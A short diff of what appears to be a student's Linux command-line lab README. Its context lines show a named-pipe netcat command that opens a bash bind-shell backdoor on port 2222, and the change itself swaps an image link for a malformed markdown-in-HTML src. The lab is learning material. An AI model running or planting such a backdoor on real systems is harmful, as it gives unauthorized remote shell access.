@@ -39,7 +39,7 @@ Next, let's start the backdoor with the following command:
 /bin/bash  0<backpipe | nc -l 2222 1>backpipe
 
 This was complicated for me but this basically created a backdoor listening on port 2222 of the linux system. <br/>
-<img src="https://github.com/mdnorris1/LinuxCLILab/upload/main/ifconfig.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+<img src="[https://github.com/mdnorris1/LinuxCLILab/upload/main/ifconfig.png](https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/ifconfig.png)" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />
 
 <!--
